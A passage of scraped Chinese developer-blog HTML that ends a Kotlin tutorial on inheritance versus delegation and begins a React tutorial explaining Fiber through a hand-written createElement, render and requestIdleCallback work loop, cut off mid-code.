<h3 data-id="heading-9">2. 属性委托（补充场景）</h3>
<p>属性委托是「将属性的 getter/setter 逻辑委托给另一个类」，语法：<code>val/var 属性名: 类型 by 委托实例</code>，常用于复用属性逻辑（如延迟初始化、观察属性变化）。</p>
<p>示例：延迟初始化（<code>lazy</code> 是 Kotlin 内置的属性委托）</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 延迟初始化：只有第一次访问时才执行初始化逻辑</span>
<span class="hljs-keyword">val</span> expensiveData: String <span class="hljs-keyword">by</span> lazy {
    println(<span class="hljs-string">"初始化数据（耗时操作）"</span>)
    <span class="hljs-string">"耗时计算后的结果"</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"开始访问数据"</span>)
    println(expensiveData) <span class="hljs-comment">// 输出：初始化数据（耗时操作）→ 耗时计算后的结果</span>
    println(expensiveData) <span class="hljs-comment">// 输出：耗时计算后的结果（直接复用已初始化的值）</span>
}
</code></pre>
<h3 data-id="heading-10">3. 委托的核心特点</h3>
<ul>
<li><strong>has-a 关系</strong>：目标类包含委托实例，语义耦合弱（可灵活替换委托对象）；</li>
<li><strong>多委托支持</strong>：一个类可实现多个接口，每个接口委托给不同实例（间接实现 “多继承” 效果，无单一继承限制）；</li>
<li><strong>解耦</strong>：避免继承带来的类层级臃肿，复用已有实现而不依赖父类层级；</li>
<li><strong>灵活扩展</strong>：可选择性覆盖委托的方法，保留核心复用，扩展额外逻辑。</li>
</ul>
<h2 data-id="heading-11">三、继承 vs 委托：核心区别与选择场景</h2>








































<table><thead><tr><th>维度</th><th>继承（Inheritance）</th><th>委托（Delegation）</th></tr></thead><tbody><tr><td>语义关系</td><td>is-a（子类是父类的一种）</td><td>has-a（目标类包含委托实例）</td></tr><tr><td>耦合程度</td><td>强耦合（子类依赖父类实现）</td><td>弱耦合（仅依赖接口，可替换委托）</td></tr><tr><td>继承限制</td><td>单一继承（只能有一个直接父类）</td><td>支持多委托（多个接口可委托给不同实例）</td></tr><tr><td>类层级影响</td><td>易造成层级臃肿（多层继承）</td><td>不影响类层级（扁平化设计）</td></tr><tr><td>功能复用方式</td><td>继承父类所有非 final 成员</td><td>复用委托类的接口实现，可选择性覆盖</td></tr><tr><td>灵活性</td><td>低（父类变更可能影响子类）</td><td>高（可动态替换委托实例，扩展逻辑）</td></tr></tbody></table>
<h3 data-id="heading-12">选择原则：</h3>
<ol>
<li>
<p>用 <strong>继承</strong> 的场景：</p>
<ul>
<li>子类与父类存在明确的「is-a」关系（如 <code>Dog</code> 是 <code>Animal</code>）；</li>
<li>需要复用父类的大部分功能，且子类需融入父类的类层级（如多态场景）。</li>
</ul>
</li>
<li>
<p>用 <strong>委托</strong> 的场景：</p>
<ul>
<li>仅需复用某个类的部分功能（而非全部）；</li>
<li>避免单一继承限制（需整合多个类的功能）；</li>
<li>希望降低耦合，允许灵活替换实现（如切换不同的存储方案、日志方案）；</li>
<li>类层级已复杂，不想再增加继承深度。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-13">四、进阶：委托实现 “多继承” 效果</h2>
<p>由于 Kotlin 禁止类的多继承，但委托支持多接口委托，可间接实现 “多继承” 的功能整合：</p>
<p>示例：一个类整合两个不同类的功能</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 接口1：飞行功能</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span>
}

<span class="hljs-comment">// 接口2：游泳功能</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Swimmable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">swim</span><span class="hljs-params">()</span></span>
}

<span class="hljs-comment">// 委托类1：实现飞行功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> : <span class="hljs-type">Flyable</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鸟类飞行"</span>)
    }
}

<span class="hljs-comment">// 委托类2：实现游泳功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Fish</span> : <span class="hljs-type">Swimmable</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">swim</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鱼类游泳"</span>)
    }
}

<span class="hljs-comment">// 目标类：通过多委托整合飞行和游泳功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> : <span class="hljs-type">Flyable</span> <span class="hljs-title">by</span> <span class="hljs-title">Bird</span>(), Swimmable <span class="hljs-keyword">by</span> Fish() {
    <span class="hljs-comment">// 可选：覆盖委托的方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fly</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"鸭子低空飞行（覆盖鸟类飞行）"</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> duck = Duck()
    duck.fly()  <span class="hljs-comment">// 输出：鸭子低空飞行（覆盖鸟类飞行）</span>
    duck.swim() <span class="hljs-comment">// 输出：鱼类游泳（复用鱼类的实现）</span>
}
</code></pre>
<p>这里 <code>Duck</code> 同时整合了 <code>Bird</code> 的飞行功能和 <code>Fish</code> 的游泳功能，且无需继承这两个类，避免了多继承的问题。</p>
<h2 data-id="heading-14">五、核心总结</h2>
<ol>
<li>继承是「强耦合的层级关系」，适合 <code>is-a</code> 场景，遵循单一继承；</li>
<li>委托是「弱耦合的功能复用」，适合 <code>has-a</code> 场景，支持多委托，灵活性更高；</li>
<li>Kotlin 推荐「组合（委托）优于继承」，减少类层级臃肿，提升代码可维护性；</li>
<li>需整合多个类的功能时，用「接口 + 多委托」替代多继承（避免歧义与耦合）。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从Demo理解Fiber]]></title>    <link>https://juejin.cn/post/7575413146923073551</link>    <guid>https://juejin.cn/post/7575413146923073551</guid>    <pubDate>2025-11-24T03:24:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146923073551" data-draft-id="7575742632333623346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从Demo理解Fiber"/> <meta itemprop="keywords" content="React.js"/> <meta itemprop="datePublished" content="2025-11-24T03:24:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="古茗前端团队"/> <meta itemprop="url" content="https://juejin.cn/user/3233040624266695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从Demo理解Fiber
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7198439419173404711/posts" data-v-d326b38e=""><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dafcebf7c91d402abd52f072a32deba8~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7198439419173404711/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="古茗前端团队" class="title" data-v-d326b38e="">古茗前端团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-11-24T03:24:39.000Z" title="Mon Nov 24 2025 03:24:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-11-24
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读1分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @古茗科技
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作者：简可</p>
</blockquote>
<p>理解Fiber，就是理解现代React的灵魂。本文本文主要探索2个问题：</p>
<ol>
<li>为什么页面看起来会卡顿？</li>
<li>Fiber是怎么解决卡顿的？</li>
</ol>
<h2 data-id="heading-0">一、为什么页面看起来会卡顿</h2>
<p>卡顿是人主观的感受，是对画面呈现的描述；研究表明：<strong>大多数人感知到不卡顿的频率在50Hz到60Hz之间，综合考量下60fps（帧率）被视为流畅的基准。</strong></p>
<h3 data-id="heading-1"><strong>1.60Fps</strong></h3>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ba961f36b5ed41898ef0c6ffb459b02b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<ul>
<li><strong>人眼感知</strong>: 人眼可以感知大约50Hz至60Hz的频率，较高的刷新率可以减少闪烁感，使画面更平滑。</li>
<li><strong>帧率与流畅度</strong>: 帧率指的是每秒显示的画面数量（fps）。帧率越高，意味着每秒显示的静态图像越多，组合起来就越能模拟出流畅的运动，给观看者带来更流畅、更逼真的体验。</li>
<li><strong>渲染间隔</strong>: 帧率和渲染间隔是互逆的关系。渲染间隔大于16.6ms（1/60Hz），意味着画面之间的过渡会不够连贯，从而产生卡顿感。</li>
</ul>
<h3 data-id="heading-2">2.浏览器渲染</h3>
<h4 data-id="heading-3"><strong>浏览器渲染的一次循环</strong></h4>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a2faefb0847242f9a0b0580668f359b4~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h4 data-id="heading-4"><strong>几个浏览器渲染问题</strong></h4>
<ul>
<li><strong>Q</strong>
<ol>
<li>每一轮 Event Loop 都会伴随着渲染吗？</li>
<li>requestAnimationFrame 在哪个阶段执行，在渲染前还是后？在 microTask 的前还是后？</li>
<li>requestIdleCallback 在哪个阶段执行？如何去执行？在渲染前还是后？在 microTask 的前还是后？</li>
<li>resize、scroll 这些事件是何时去派发的？</li>
</ol>
</li>
<li><strong>A</strong>
<ol>
<li>事件循环<strong>不一定</strong>每轮都伴随着重渲染，但是如果有微任务，一定会伴随着<strong>微任务执行</strong>。</li>
<li>requestAnimationFrame在重新渲染屏幕<strong>之前</strong>执行，非常适合用来做动画。</li>
<li>requestIdleCallback在渲染屏幕<strong>之后</strong>执行，并且是否有空执行要看浏览器的调度，如果你一定要它在某个时间内执行，请使用 timeout参数。</li>
<li>resize和scroll事件其实自带节流，它只在 Event Loop 的渲染阶段去派发事件到 EventTarget 上。</li>
</ol>
</li>
</ul>
<h4 data-id="heading-5">为什么浏览器卡顿</h4>
<ul>
<li>浏览器的渲染和js的执行是互斥的；
<ul>
<li>js可以操作dom，如果在渲染的时候操作了dom，不知道以哪个为准；</li>
</ul>
</li>
<li>一般浏览器的刷新率为60hz，即1秒钟刷新60次。1000ms / 60hz = 16.6ms ，大概每过16.6ms浏览器会渲染一帧画面，也就是一次eventLoop需要保证在16.6ms内完成；</li>
<li>在需要连续渲染的时候，如果js的执行超过16.6ms，导致染间隔大于了16.6ms，就会导致卡顿；</li>
</ul>
<h2 data-id="heading-6">二、Fiber是怎么解决卡顿的</h2>
<p>React Fiber的解决方案：<strong>可中断的异步渲染，<strong>它的核心思想是：<strong>将不可中断的同步更新，拆解成可中断的异步工作单元</strong>，也就是</strong>中断和重启。</strong></p>
<p>下面我们一起通过demo来简单实现Fiber，以更好的理解Fiber：</p>
<h3 data-id="heading-7">1.原生react代码</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#root"</span>);
<span class="hljs-keyword">const</span> element = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(
    <span class="hljs-string">'div'</span>,
    {
        <span class="hljs-attr">title</span>: <span class="hljs-string">'div'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'div'</span>
    },
    <span class="hljs-string">'div  '</span>,
    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h1'</span>, <span class="hljs-literal">null</span>,
        <span class="hljs-string">'h1'</span>,
        <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'p'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'p'</span>)
    ),
    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h2'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'h2'</span>),
)

<span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(
    element,
    container
)
</code></pre>
<h4 data-id="heading-8">效果</h4>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d6b8218d8e9b4ae8ac37a56006021a04~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.自己实现createElement和render</h3>
<h5 data-id="heading-10">createElement.js</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 目标？
 * 1、创建fiber节点
 */</span>
<span class="hljs-comment">/**
 * 需要接收哪些参数？
 */</span>
<span class="hljs-comment">/**
 * 需要做什么处理？
 * 1、设置type和props，props内的children
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-params">type, props, ...children</span>) {
    <span class="hljs-keyword">return</span> {
        type,
        <span class="hljs-attr">props</span>: {
            ...props,
            <span class="hljs-attr">children</span>: children?.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> child === <span class="hljs-string">'object'</span> ? child : <span class="hljs-title function_">createTextElement</span>(child)
            })
        }
    }
}

<span class="hljs-comment">// 创建文本类型的fiber节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createTextElement</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'TEXT_ELEMENT'</span>,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">nodeValue</span>: text,
            <span class="hljs-attr">children</span>: []
        }
    }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    createElement
}
</code></pre>
<h5 data-id="heading-11">render.js</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 目标？
 * 把fiber节点转换为真实dom
 */</span>
<span class="hljs-comment">/**
 * 做哪些事情？
 * 1、创建dom节点
 * 2、把dom节点挂载到真实dom
 * 3、把子节点也做上述处理
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])


    element?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">render</span>(child, dom))

    container.<span class="hljs-title function_">appendChild</span>(dom)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-12">执行</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createElement } <span class="hljs-keyword">from</span> <span class="hljs-string">'./createElement.js'</span>;
<span class="hljs-keyword">import</span> { render } <span class="hljs-keyword">from</span> <span class="hljs-string">'./render.js'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#root"</span>);

<span class="hljs-keyword">const</span> element = <span class="hljs-title function_">createElement</span>(
    <span class="hljs-string">'div'</span>,
    {
        <span class="hljs-attr">title</span>: <span class="hljs-string">'div'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'div'</span>
    },
    <span class="hljs-string">'div  '</span>,
    <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h1'</span>, <span class="hljs-literal">null</span>,
        <span class="hljs-string">'h1'</span>,
        <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'p'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'p'</span>)
    ),
    <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h2'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'h2'</span>),
)

<span class="hljs-title function_">render</span>(
    element,
    container
)
</code></pre>
<h5 data-id="heading-13">效果（和原生react一样）</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/583f851b977149828103d2788c946fb6~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h5 data-id="heading-14">这样写有什么问题？</h5>
<ul>
<li>不能中断执行，可能js执行太长，导致卡顿</li>
</ul>
<h3 data-id="heading-15">3.优化</h3>
<ul>
<li>怎么可以中断、重启执行呢？
<ul>
<li>拆分工作单元</li>
</ul>
</li>
<li>怎么控制每次js执行时间，不占用渲染进程时间？
<ul>
<li>在eventLoop的剩余时间执行js，那我们就想到一个API：requestIdleCallback (<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2FrequestIdleCallback" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestIdleCallback" ref="nofollow noopener noreferrer">developer.mozilla.org/zh-CN/docs/…</a>) 该方法插入一个函数，这个函数将在浏览器空闲时期被调用</li>
</ul>
</li>
<li>优化思路图</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6ff2feb764c4316b17b6c8a01eabe67~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h4 data-id="heading-16">第一版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 记录下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;

<span class="hljs-comment">/**
 * 要做些什么事情？
 * 1、判断是否有工作单元需要执行
 * 2、判断浏览器是否空闲
 * 3、如果有工作单元且浏览器空闲，执行工作单元
 * 4、一个工作单元执行完成后获取下一个工作单元
 */</span>
<span class="hljs-comment">/**
 * 空闲时间执行完后，交给渲染进程，再怎么重启下一工作单元的执行？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 表示线程繁忙，应该中断渲染</span>

    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        <span class="hljs-comment">/**
         * 1、执行工作单元
         * 2、返回下一个工作单元
         */</span>
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);

        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }
    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">parent</span>) {
        fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>.<span class="hljs-title function_">appendChild</span>(fiber.<span class="hljs-property">dom</span>)
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">childrenElement, index</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newFiber = {
